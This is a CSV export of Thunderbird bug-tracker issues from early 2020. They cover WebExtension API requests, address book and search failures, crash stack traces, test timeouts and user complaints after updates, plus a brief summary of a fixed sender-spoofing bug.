Issue id,Summary,Status,Priority,Resolution,Description
1617022,compose.onBeforeSend listener doesn't actually change composed message,RESOLVED,--,FIXED,"Due to a series of mistakes, trying to change a message with an onBeforeSend listener doesn't actually do anything. This needs proper automated tests."
1617109,All columns disappear in message list for Inbox. And unable to restore subject column.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: No idea what actually triggered it. Actual results: Suddenly the entries for the Inbox for one of my IMAP email accounts appeared all blank. Or rather, there was one blank line for each message, and the heading line was also blank. All other folders and accounts were OK. Right-clicking in the heading line showed no columns displaying. I could restore the tag for all fields, except for the Subject line which does not appear as an option (I assume this is by design). I tried restarting in safe-mode, with all variants, including resetting settings and plugins, but no joy with either combination. The one inbox still shows no subject line. Expected results: The columns for my Inbox should have been kept as is."
1617130,Global search is totally broken in 68.4.1,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Global Search for a word that IS present in some emails FYI: ThB 68.4.1 in Xubuntu 19.10 freshly dist-upgraded FYI: I tried it in safe mode too. Actual results: The list of resulting emails appears, but clicking on emails to open them is broken: for some results, it opens a blank page, for others it opens a totally unrelated email... As can be seens in the image, clicking first result leads to opening of a blank page... Expected results: Clicking on one of the result should open the corresponding email! If this is a local problem (some kind of index has been broken during an update), I would love to have a work-around so that I don't have to reconfigure a new fresh account from start..."
1617284,windows 10 start application with shared profile fails after update to 68.5.0 on fedora,RESOLVED,--,INVALID,"environment: dual boot windows 10 and fedora 31 windows has Thunderbird 68.4.2 fedora has Thunderbird is 68.4.1 Both Thunderbird applications using the same profile on a data partition (ntfs) /mnt/my_data_drive/Thunderbird/profile I installed an update in Fedora for a new version of Thunderbird (68.5.0) I was able to access and use the shared Thunderbird profile on fedora. When I started windows and try to start Thunderbird, A window pops up saying: ""A newer version of Thunderbird may have made changes to you profile which are no longer compatibles with this older version. Use this profile only with that newer version, or create a new profile for this installation of Thunderbird."" So I updated windows Thunderbird to 68.5.0. I still get the window message above. I then reinstalled the prior version of Thunderbird on Fedora. I can now access and use the shared profile on both systems. So I tried again, this time Windows Thunderbird is at 68.5.0. When I install the Thunderbird 68.5.0 on fedora, which works fine, Then I reboot and try to start Thunderbird on windows , I still get the message above, even though both Thunderbird installations are 68.5.0. I created a new profile, set up a"
1617299,DisplayUtils.getCardForEmail virtually duplicates GlodaUtils.getCardForEmail,NEW,--,,`DisplayUtils.getCardForEmail` and `GlodaUtils.getCardForEmail` are near-duplicates and could probably be consolidated into one to save confusion with similar functions with not quite the same signature. https://searchfox.org/comm-central/rev/631e8b52544ba72abc8a1ab9551a57f3a6441960/mailnews/db/gloda/modules/GlodaUtils.jsm#90-106 https://searchfox.org/comm-central/rev/631e8b52544ba72abc8a1ab9551a57f3a6441960/mail/base/modules/DisplayNameUtils.jsm#28-51
1617370,Sender Email Address Spoofing by encoded extraneous white space in display name,RESOLVED,--,FIXED,"+++ This bug was initially created as a clone of Bug #1506587 +++ By abusing Unicode whitespaces (e.g., U+3000) within the 'From:' email header, an attacker can spoof the sender email address when displayed by the Thunderbird mail client. Turns out bug 1506587 didn't fix the case where the special characters are encoded. Testcase in attachment 9128245."
1617371,comm/mailnews/base/src/nsMailDirProvider.cpp:170:22: error: no member named 'GetSelectedLocale' in 'nsIXULChromeRegistry',RESOLVED,--,FIXED,Most probably busted by bug 1616912. A build with the parent changeset is successful locally.
1617379,WebExtension experiments don't have access to the addressBookCache,RESOLVED,--,FIXED,"As far as I can tell, the extension context doesn't make the `addressBookCache` available. This makes it hard for authors to design experiment APIs where we pass in the contact id."
1617391,unnecessary full macOS build when requesting --artifact,RESOLVED,--,WORKSFORME,"When requesting a try build with syntax ```try: -b o -p win64,linux64,macosx64 -u none --artifact``` in addition to a macOS ```Ba```, a regular full ```B``` build is started. Intentional or bug? Should the B build be suppressed? For example: https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&revision=435783ede368d7e6bce4df53a40549bc40a88da6"
1617393,browser.mailingLists.get() returns a MailingListNode with contacts undefined,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: In my 'Limit non-BCC Recipients' Mail Extension I need to match recipient entries which are not email addresses with mailing lists and count the number of contacts. I loop round browser.addressBooks.list, browser.mailingLists.list, and browser.mailingLists.get to match on each such recipient. I can match OK but I find that the contacts property of the MailingListNode is (always?) undefined. e.g. a matching list: This list: {""id"":""0c474d69-316a-452d-b5fa-3d1531438de4"",""parentId"":""49e58e58-257c-40bd-95a5-238931df19ca"",""type"":""mailingList"",""name"":""List_of_2_valid"",""nickName"":"""",""description"":""""} That list has 2 entries. The 2 entries are in the same address book and I clicked on the suggested contacts when I entered them. I note that contacts is optional, but I assume a list can be empty. https://thunderbird-webextensions.readthedocs.io/en/latest/mailingLists.html#mailinglists-mailinglistnode Using TB 75.0a1 (2020-02-21) (64-bit) One for Geoff Lankow I think."
1617398,"After update Jan 2020: Sending mail ok, but cannot receive mail anymore due to timeout",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362 Steps to reproduce: Thunderbird (German version) updated automatically to Version 68.5.0 (32-Bit). Actual results: Since this update it is impossible receiving mails because after a while ""Timeout"" Message appears. However: Sending e-mails is working properly. Expected results: Receiving e-mails…."
1617399,Instructions for migrating files and contacts from Windows Live Mail in a windows 10 are wrong or obsolete. I cannot find help for this in your huge morass of help and discussions.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363 Steps to reproduce: Have used Windows Live Mail for years but MicroMonopoly ended support for it in Windows 10 as Windows 7 support ended. I installed Thunderbird, but cannot find a way to import all my old computer-hosted emails and contacts. New mail off the server comes into Thunderbird, and new composed mail goes out, but I want the threads of previous communications and contracts and contacts also brought into the Thunderbird system, and cannot find how. Help postings on doing this advise using tabs and subtabs in windows live mail that do not seem to exist. Ergo, the help is either fatally wrong or obsolete. If Thunderbird cannot do what I want, do you recommend some email client that will do the importing of old pop3 mail on my computer and contacts on my computer? Actual results: I got left in computer hell Expected results: Thunderbird should have this function. Help should have help postings to correctly guide you to the correct tabs and process steps."
1617406,comm/mail/test/browser/composition/browser_imageInsertionDialog.js | Uncaught exception - at resource://testing-common/mozmill/utils.jsm:386 - TimeoutError: Timeout waiting for modal dialog to open.,RESOLVED,P5,FIXED,**Filed by:** mkmelin [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=290035215&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/LvYxF2YcQHWpt6cD2nA5lQ/runs/0/artifacts/public/logs/live_backing.log --- Fails locally too
1617438,pop (non-Inbox) gmails are not deleted from the server per retention policy setting,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.103 Steps to reproduce: i don't remember when i start using thunderbird more then 10 year ago. at that time i set up my gmail email (IMAP) to be downloaded on my computer and set the preferences for my needs. I set on folders and bin/junk etc Retention policy to delete after 2 days old and i thought that was ok. Actual results: this year i log in into my mail and i had a look on all mails, for my surprise mails were never deleted from the server ending up with 20K email to clean up. i have made changes to i un-tick synchronisation for offline use with same settings on folders for the mail to be deleted after 2 days but i see same problem, mails are not actually deleted from the server Expected results: they should be deleted based on my settings not to find mails from 2000 in my mail (under all mails)"
1617445,"""find"" will steal focus.",RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: see bug #1554370. It was fixed around 2 months ago but reappear now with TDB 68.5.0 Actual results: see bug #1554370 Expected results: see bug #1554370
1617448,browser.compose.beginNew needs a way of specifying the identity to use,RESOLVED,--,FIXED,"In Conversations we offer a button that allows starting an email directly to a contact from within the message header. If I use `browser.compose.beginNew`, then I have no option to specify that it should use a particular account / identity / email address to use. This means that any time a user opens a compose window with this method, they'll be defaulted to the default identity, even though they're on a different account. This probably depends on some of the work in bug 1531593."
1617461,messageDisplay APIs don't take account of multiple message selection,RESOLVED,--,FIXED,"Selecting multiple messages is a possibility in Thunderbird and Thunderbird displays the summary for them, however the messageDisplay APIs only take account of a single message being displayed."
1617477,"Since the last update, when I log on, I go to a different email than my default email..",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Open Mozilla Thunderbird email client. Actual results: I have four email addresses on Thunderbird. They all open, however, my default email does not open on my inbox as previously. A different email address that is not my default opens on the inbox. Expected results: My default email should open on my inbox as it has always done."
1617486,Outgoing server panel false authentification method,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Go to: Tools>Account Setting>Outgoing server (SMTP) Just click on the list a server which have ""normal authentification method"", so the ""authentification method"" is empty in the low panel Now click on the list on a server which have ""Oauth2"", so the ""authentification method"" in panel is ""Oauth2"" Now return on the first server. Actual results: When you return on the server which had an empty authentification method, Thunderbird now indicated : ""Oauth2"" in the low panel Expected results: Thunderbird should indicate the real authentification method ..."
1617490,contacts API : storing photos must be handled by the API directly,RESOLVED,P3,FIXED,"Currently, if I want to add a photo to contact, I need to set the following contact properties: * PhotoName * PhotoType * PhotoURI with `PhotoURI` pointing to a file inside the `Photos` folder inside the users profile. With WebExtensions however direct filesystem access is not possible, so the contacts API must acceppt the image data directly and take care of the storage. We still need the `PhotoURI` property, to store an external link, so do not throw that away :-)"
1617492,beta 74 of thunderbird kills connection to Mac Address book - address autocomplete,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Updated to 74 on beta channel Tried to write email Actual results: NO saved addresses, including NO Mac Address Book addresses were accessible on address lines OR in address book view Expected results: addresses should resolve in character by character progressive display. None did in 74 including in safe mode. Reloaded 68, and they were resolved to Mac Addr Bk entries."
1617514,"Action events should give whole tab objects, not just tab IDs",RESOLVED,--,FIXED,"+++ This bug was initially created as a clone of Bug #1615934 +++ Ugh, I've done this all wrong. :-( According to [MDN](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/browserAction/onClicked), the WebExtensions browserCompose onclicked event has always had a tab object argument and recently gained an OnClickData argument. Ours has neither. Worse, our very similar messageDisplayAction has just an integer tab id (not the full object) and composeAction just gained the same. I think we should just fix them all, and compose.onBeforeSend. Only messageDisplayAction has this on 68, and AFAICT the usage is minimal to none."
1617518,After creating a search folder for unread news and feeds the folder is not displayed maildir only,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: I created a new thunderbird profile. I changed the configuration to store messages with each message in its own file. I added a gmail account. I added a news and feeds rss account. I searched news feeds for unread articles and then saved the result as a search folder. I looked at the first unread article. I exited thunderbird and relaunched it. Actual results: The unread search folder does not appear. Expected results: There should be a folder called unread which gets populated with the unread news articles (status isn't read). This has worked before but it maybe related to the setting to store emails each email in its own file, although I cannot see why. find .thunderbird/ -print|grep -i unread .thunderbird/femxw20l.default-release/Mail/Feeds/unread.msf thunderbird -v Thunderbird 68.4.1"
1617530,Crash in [@ RtlAcquireSRWLockExclusive | nsWabAddressBook::Initialize],RESOLVED,--,FIXED,This bug is for crash report bp-825dd8ad-f6db-4f29-87c2-0624d0200224. ``` Top 10 frames of crashing thread: 0 ntdll.dll RtlAcquireSRWLockExclusive 1 xul.dll nsWabAddressBook::Initialize comm/mailnews/addrbook/src/nsWabAddressBook.cpp:113 2 xul.dll nsWabAddressBook::nsWabAddressBook comm/mailnews/addrbook/src/nsWabAddressBook.cpp:97 3 xul.dll nsAbWinHelperGuard::nsAbWinHelperGuard comm/mailnews/addrbook/src/nsAbWinHelper.cpp:915 4 xul.dll nsAbOutlookInterface::GetFolderURIs comm/mailnews/addrbook/src/nsAbOutlookInterface.cpp:32 5 xul.dll XPTC__InvokebyIndex 6 @0xce1d9f9dd7 7 xul.dll nsXPTType::IsDependent const xpcom/reflect/xptinfo/xptinfo.h:258 8 xul.dll static XPCWrappedNative::CallMethod js/xpconnect/src/XPCWrappedNative.cpp:1145 9 xul.dll XPC_WN_CallMethod js/xpconnect/src/XPCWrappedNativeJSOps.cpp:947 ```
1617535,Intermittent comm/mail/test/browser/addrbook/browser_addressBook.js | Uncaught exception - at resource://testing-common/mozmill/AddressBookHelpers.jsm:260 - Error: Could not find the index for the address book named Some Mailing List,RESOLVED,P5,FIXED,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=290126954&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/RtM2wMSOQjGFLfETQ5IrjQ/runs/0/artifacts/public/logs/live_backing.log ---
1617557,Insane CPU use in latest version,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Start Thunderbird, allow it to update to latest version. Versions 68.4.2 through 68.5.0 are affected. Actual results: CPU use is not sustainable on consumer laptops. You need to stop developing on high powered machines, or at least test on cheap consumer hardware. Thunderbird is almost unusable now on the following: AMD A8-4500M APU or Intel Pentium N3710 Previous versions of Thunderbird worked fine. Someone added something without thinking or testing or cpu profiling. It looks like it was UI/UX work - which is the usual culprit in such cases. It is very Dilbert. Please revert the changes and refrain from untihinking modification of the UI. Don't let the C# .net kids at the code. Please. Expected results: It should run normally. Not pause for minutes at a time processing some stupid UI skin that the kids put on top of the old code. Also, a throwaway email account was created to post this bug, because you can't just post people's email addresses just because they created an account. You'll need to fix that too."
1617597,Expired certificates for mail servers breaks TB,RESOLVED,--,INCOMPLETE,"The certificate for my mail server expired. TB will not let me do anything since it will not allow me to accept the expired cert, or to cancel. No matter what I push, the expired cert window keeps coming up, and I cannot check my mail for non-expired servers."
1617737,Over 800 nsemail.eml files in temp folder,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Open temp folder Actual results: Observer 843 files with name nsemail.eml and increments of that. Also rogue .pdf files from email. Thunderbird needs to not create this mess. Expected results: Not seen those files
1617755,Master password prompt appears after connecting to mail server,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Opened thunderbird with at least one account that has it's credentials protected with master password. Actual results: TB connects to the mail server, reads the account creds, then realises it needs to decrypt them, prompting me for master pass. It then hangs until the password is or isn't entered, and frequently fails to connect to the mail server as the connection gets dropped before the whole process is complete. Expected results: TB should see that the account has encrypted creds and prompt for master pass (until it's either entered or cancelled) *before* making any connection to the server. I used to be able to work around this issue with the StartupMaster plugin, however it is no longer compatible with TB and likely never will be because it blocked the whole program from loading."
1617796,Shutdown Crash in [@ ldap_abandon_ext] with Mac,RESOLVED,--,FIXED,"#7 crash for Macs for 68.5.0. In the past 6 months there are not crashes prior to 68.3.0, so regression? Further, the earliest non-release crash is 71.0b1? buildid 20191113091023 bp-f4eae0cb-736f-43a5-af3e-b1e720191128 https://crash-stats.mozilla.com/signature/?product=Thunderbird&signature=ldap_abandon_ext&date=%3E%3D2019-08-25T03%3A02%3A00.000Z&date=%3C2020-02-25T03%3A02%3A00.000Z#graphs This bug is for crash report bp-a72338e5-8aaa-456e-8ba9-4fa130200225. 75.0a1 ``` Top 10 frames of crashing thread: 0 libldap60.dylib ldap_abandon_ext comm/ldap/c-sdk/libraries/libldap/abandon.c:96 1 XUL XUL@0x96f0 2 XUL XUL@0x447d9e 3 XUL XUL@0x44b558 4 XUL XUL@0x54ced5 5 XUL XUL@0x54dc5c 6 XUL XUL@0x447d9e 7 XUL XUL@0x44b558 8 XUL XUL@0xa07cf3 9 XUL XUL@0x9c0655 ``` This happened on shutdown, after I had attempted to delete the Mac OSX Address Book, which resulted in the following in the Error Console. NS_ERROR_UNEXPECTED: Unexpected error'Unexpected error' when calling method: [nsIAbManager::deleteAddressBook] abCommon.js:372 21:49:42.542 An error occurred executing the button_delete command: [Exception... ""Unexpected error'Unexpected error' when calling method: [nsIAbManager::deleteAddressBook"
1617826,"Question marks in the ""to:"" input and the ""wrote:"" line when replying",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Receive an e-mail with certain encoding of international characters in the ""From:"" field (see the attached bad-name.eml, drag it into your inbox or a local folder and press ""Reply""). Press ""Reply"". Actual results: The ""to:"" input and the ""wrote:"" line contain the question mark glyphs instead of international characters: ������-������ <test@test.org> Expected results: The ""to:"" input and the ""wrote:"" line should contain exactly the same characters as seen in the inbox column ""From"" and the preview field ""From"": абвгде-ёжзикл <test@test.org> The translation of the characters in the inbox seems to depend on the mailbox. For example, when I drag the .eml file to my Gmail inbox, the ""From"" column displays the question marks too, but when I use a local folder or my Lotus mailbox the ""From"" column displays correctly. The preview field always displays the correct characters. I couldn't find the mailbox-specific encoding settings. My OS region is Russia, the Thunderbird version is Russian. The characters in the attached bad-name.eml are from Russian alphabet"
1617868,Unable to star messages,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.103 Steps to reproduce: I updated Thunderbird to the last release 68.5.0 (32bits) of february 11th 2020. I am unable to star messages in the main inbox panel. I cannot see what messages are starred. Actual results: The column with the star in the heading is visible, but the given stars are not. The column width seems to be set too small, but it is not possible for me to change the width. Expected results: I should see the yellow star next to the starred messages and I should be able to star or unstar message in the star-column."
1617904,Click second time once opened attachment,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36 Steps to reproduce: Receive message with attachment. Select it in message list. Click the attachment filename (PDF). Open with Acrobat Reader. Close Acrobat Reader. Go back to TB, click the attachment once again. Actual results: Nothing happens after second click. Expected results: There should be again opened window with selection what to do with the attachment (Open/Save)."
1617932,Mails are lost when moving them to an other folder and renaming folder afterwards,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: - I've moved 3 Mails from my Inbox to an other folder by drag and dropping. - Then like 2 seconds afterwards I've renamed the folder. Actual results: The moved Mails don't appear in the renamed folder, but also aren't in the original folder anymore. I can't find them anywhere. Also using the webmail interface I can't find them. So I guess they really are gone... Expected results: The moved mails should be in the renamed folder. --- some extra infos: The IMAP Server is a dovecot 2.3.x. The internet connection I'm using is sometimes pretty slow (lot of package loses). So maybe it didn't finish moving the mails yet, when renaming the folder?"
1617949,datepicker/timepicker background do not change color while open but text do,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: With HighContrast theme, try to add a new task in Thunderbird's calendar. On the ""start"" row, click date or hour to open the popup. Actual results: The text (date or time) becomes invisible. Expected results: The text switches to selected item color (ok) but the background color should follow and become black."
1618007,Unable to delete email until after restart,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Steps to reproduce: After using Thunderbird for some time (I'm not sure of the interval between occurrences of the issue) I am no longer able to delete email. In list view, I have tried using the Delete key, the Edit menu option to Delete, and the right-click menu option to Delete. In message view, I have tried using the Delete key and the Edit menu option to Delete. None of these five methods delete the email. I am able to confirm that the message persists (and the issue remains) after quitting and restarting Thunderbird normally. I've also observed that if an email is marked as ""Unread"" the above methods will mark the email as ""Read"". This suggests that the ""Delete"" event is being triggered correctly, it just isn't being handled correctly. After I observe the issue, I am able to resolve using the following steps: First, I restart using the Help menu option to Restart with Addons Disabled. Then, during the restart, when prompted with a dialog about safe mode, instead of continuing in safe mode, I do not change any of the options, and simply click Quit. I then resta"
1618100,Address book window does not update when books are added or removed,RESOLVED,--,FIXED,There's some XPCOM weirdness going on here that causes the address book listener to sometimes work but mostly not work.
1618224,Address book completely broken in 74.0b1,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Immediately after upgrade to 74.0b1 Address Book functions ceased working. Actual results: Autocomplete in mail compose window fails to match any Thunderbird Address Book or macOS Address Book entries. All email addresses must be entered manually. Thunderbird Address Book shows no entries at all. Buttons to add new contact card or list do not trigger any action. Address book backups and SQLite database appear to be intact and contain valid information. SQLite database browser shows that address and history databases contain expected structure and contact information. New profile or starting in safe mode shows same behavior: Address Book and mail compose address autocomplete do not work, and no new contacts or contact lists can be added. Expected results: Entering contact name or email should trigger automatch/autocomplete in mail compose window. Thunderbird Address Book should show existing contacts and allow addition of new contacts or lists. System (macOS) Address Book should be queried for matches during mail compose autocomplete. All of these functions worked in v7"
1618296,Quick Filter starts full search when typing fast enough,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: This happens on two different TB installations with 68.5.0 on Windows 10: When typing something in the Quick Filter too quickly, the 'full search' is opened using those characters. This should normally only happen when pressing return twice to activate the search across all folders. so steps: - Activate Quick Filter - Start typing something with some speed Actual results: - After about 3-5 characters, the popup comes up suggesting to press enter again to search across all folders, even though only some characters were entered - When continuing, the search opens using the characters entered up to now The error console shows: Error: There is no active filterer but we want one. errUtils.js:79:10 errorWithDebug resource:///modules/errUtils.js:79 get activeFilterer chrome://messenger/content/quickFilterBar.js:587 handler chrome://messenger/content/quickFilterBar.js:234 _fireCommand chrome://global/content/elements/search-textbox.js:241 notify resource://gre/modules/Timer.jsm:62 Expected results: - Quick Search should have continued, no full search started."
1618327,"How to filter e-mail on ""source"" info of an e-mail",RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: I drop an info in the filter but this does not work Actual results: nothing
1618338,Labels for Subject and Date overlap,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Display a mail Actual results: The labels overlapped, so that the date becomes unreadable Expected results: Ellipsis on the subject"
1618389,Search not working for short words with 2 characters,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Steps to reproduce: I am searching through my mail but short search terms seem to have no effect. For example I wanted to order some ink cartridges and so I searched my mail several times using related terms to find out who I had ordered from last time. Actual results: I searched these terms, all with no results: hp 96 ""hp 96"" 2 pk ""2 pk"" I searched these terms, which showed results: deskjet photosmart All of the queries should return the same results. Expected results: At the very least it is misleading for Thunderbird to tell me there's no results for what I typed when it (I guess) ignores those search terms. It should say the search terms are too short, if that's the case. However I think short search terms should work the same as long search terms. I figure maybe the short words and terms aren't indexed because it would use more resources. I checked help but I don't see it documented."
1618482,Message moved to archives after key import,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: - I received an email with a new PGP key - I double-clicked on the attachment which led to the Enigmail Confirmation dialog box asking me how to handle the OpenPGP key file - After clicking Import, the new key was indeed added but the message itself was gone The precise version is 68.4.1 (64-bit) with Enigmail version 2.1.2 (20191031-1357) Actual results: I found the original message via the search function and it had been moved automatically in the Archives/2020/ location. This folder did not exist before and it holds just this message. Expected results: Only the key should have been added (as it did) and the message should have remained in the Inbox. Note: my experience has some similarities to bug 1214483 which did not show up in the list of potentially related bugs. Please excuse if I overlooked another report."
1618485,[StorageManager web API] navigator.storage.persist() never fulfills Promise,RESOLVED,--,WONTFIX,"Consider a WebExtension with ""unlimitedStorage"" permission and this code in background.js: ```javascript async function main() { console.log(""Start""); console.log(await navigator.storage.persisted()); console.log(await navigator.permissions.query({name:'persistent-storage'})); console.log(await navigator.storage.persist()); console.log(""Stop""); } main(); ``` Expected output (as in FireFox 73) ``` Start false PermissionStatus { state: ""granted"", onchange: null } true Stop ``` What actually happens in Thunderbird 68 and 74 ``` Start false PermissionStatus { state: ""granted"", onchange: null } ``` The call to navigator.storage.persist() never fullfills and code execution stops. I was testing this on Windows 10."
1618561,calendar tab always opens at last position,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Using ThB 68.4.1 with calendar (google) & News feed & enigmail. Also, I have a Master password set. When I open Thb. I want to have the following Tabs always opened: - Inbox - One of the sub-folder of the Inbox - Calendar - News & Feeds So I configure ThB to have these Tabs opened in this order. See top part of the attached picture Actual results: Since recently (few weeks), if I close ThB, and re-open it, it asks for the Master password, then shows the Tabs, but in the following order: - Inbox - One of the sub-folder of the Inbox - News & Feeds - Calendar See Bottom part of the attached picture Expected results: The Tabs should have been re-opened in the same order as I configured them before closing ThB: - Inbox - One of the sub-folder of the Inbox - Calendar - News & Feeds What I guess is happening is that in parallel as ThB asks for the Master Password, it opens some Tabs it can out-of-the-box (the ones that are not protected by Password? or the ones not being managed by a plugin?), then once the Master Password is validated, it opens the remaining Tabs (the ones that we"
1618616,Button overlap in Accounts Settings pane with smaller windows,RESOLVED,--,FIXED,"When the Default Identity description wraps to a second line, because the window is too small, the ""Manage Identities..."" button overlaps the ""Edit SMTP server..."". This comes probably because of the change to use <fieldset>."
1618623,Send button does not work after upgrade onto Thunderbird 60.6.1. (64-bit) on Ubuntu Linux,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 Steps to reproduce: - Upgrade from an older Thunderbird version onto 60.6.1 - OS: Ubuntu Linux Solution which temp solved my issue: - I disabled my companies LDAP connection to the Thunderbird client Just remove any direct LDAP connection from the email account profile/configuration 1. Go to Menu tab: Edit 2. Select: Composition 3. Disable: Any LDAP connection/entry 4. Select instead: Local Address Books 5. Save 6. Restart Thunderbird Actual results: - Send button has not worked anymore after the upgrade was finished Expected results: - I normally should be able to send emails after i completed the upgrade onto a newer version
1618660,Street Address wraps too early in Address Book,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Viewed contact details in Address Book. Actual results: The street address wraps too early. 9999 Sherwood Dr Expected results: The street address should have been displayed on one line. 9999 Sherwood Dr
